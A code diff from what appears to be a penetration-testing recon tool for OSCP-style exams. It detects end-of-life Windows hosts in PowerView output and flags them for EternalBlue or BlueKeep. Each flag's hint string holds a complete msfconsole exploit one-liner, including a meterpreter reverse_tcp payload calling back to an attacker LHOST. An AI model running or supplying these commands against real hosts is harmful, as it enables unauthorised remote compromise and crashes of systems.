@@ -7914,6 +7914,70 @@ def _multiline_passes(path, report, store):
                                        source=path, line=_ln(_pm),
                                        meta={"source": "powerview"}))
 
+    # iter-289: PowerView `Get-DomainComputer | fl` output with EOL
+    # Windows OS = MS17-010 EternalBlue candidate (XP, 2000, 2003,
+    # 2008 non-R2) or BlueKeep CVE-2019-0708 candidate (Windows 7,
+    # Vista, Server 2008 R2). Both are OSCP+ exam-legal but count
+    # toward the one-target Metasploit quota. Two field orderings.
+    _PV_OS_A = re.compile(
+        r'(?im)^samaccountname\s*:\s*([\w.\-$]{1,60}\$)\s*[\r\n]+'
+        r'(?:(?!^samaccountname\s*:)[\s\S]){0,800}?'
+        r'^operatingsystem\s*:\s*([^\r\n]{4,120})')
+    _PV_OS_B = re.compile(
+        r'(?im)^operatingsystem\s*:\s*([^\r\n]{4,120})'
+        r'(?:(?!^samaccountname\s*:)[\s\S]){0,800}?'
+        r'^samaccountname\s*:\s*([\w.\-$]{1,60}\$)')
+    # Match on distinctive EOL substrings; case-insensitive.
+    _OS_MS17010 = re.compile(
+        r'(?i)Windows\s+(?:2000|XP|Server\s+2003|Server\s+2008(?!\s+R2))')
+    _OS_BLUEKEEP = re.compile(
+        r'(?i)Windows\s+(?:7|Vista|Server\s+2008\s+R2)')
+    if not filters.is_doc_file(path):
+        _os_seen = set()
+        for _rx, _sam_grp, _os_grp in ((_PV_OS_A, 1, 2), (_PV_OS_B, 2, 1)):
+            for _om in _rx.finditer(text):
+                _sam = _om.group(_sam_grp).strip()
+                _os_str = _om.group(_os_grp).strip()
+                if _sam.lower() in _os_seen:
+                    continue
+                _os_seen.add(_sam.lower())
+                _sam_sh = _sam.replace("'", "'\\''")
+                _sam_no = _sam.rstrip("$")
+                if _OS_MS17010.search(_os_str):
+                    report.add("HIGH", "RECON", path, _ln(_om),
+                               f"EOL Windows on {_sam}: {_os_str[:60]}"
+                               f" - MS17-010 EternalBlue candidate",
+                               hint=(f"one-target quota: msfconsole -q"
+                                     f" -x 'use exploit/windows/smb/"
+                                     f"ms17_010_eternalblue; set "
+                                     f"RHOSTS {_sam_no}.<dom>; set "
+                                     f"payload windows/x64/meterpreter"
+                                     f"/reverse_tcp; set LHOST <me>; "
+                                     f"run'  |  manual: python2 "
+                                     f"AutoBlue-MS17-010/scan_win7_"
+                                     f"win2k8_win2008r2.py {_sam_sh}"))
+                elif _OS_BLUEKEEP.search(_os_str):
+                    report.add("HIGH", "RECON", path, _ln(_om),
+                               f"EOL Windows on {_sam}: {_os_str[:60]}"
+                               f" - BlueKeep RDP CVE-2019-0708 "
+                               f"candidate",
+                               hint=(f"one-target quota + FRAGILE on "
+                                     f"default configs (needs precise"
+                                     f" hal.dll offsets): msfconsole "
+                                     f"-x 'use exploit/windows/rdp/"
+                                     f"cve_2019_0708_bluekeep_rce; "
+                                     f"set RHOSTS {_sam_no}.<dom>; "
+                                     f"check; run'  |  ONLY run "
+                                     f"check first - the RCE crashes"
+                                     f" the box ~50%"))
+                else:
+                    continue
+                if store is not None:
+                    store.add(Evidence(kind="host", host=_sam,
+                                       fact="eol_os",
+                                       source=path, line=_ln(_om),
+                                       meta={"os": _os_str[:80]}))
+
     # iter-279: PowerView `Get-DomainComputer -Unconstrained | fl` output.
     # `TRUSTED_FOR_DELEGATION` in userAccountControl = unconstrained
     # Kerberos delegation. On DCs it's by design (SERVER_TRUST_ACCOUNT)
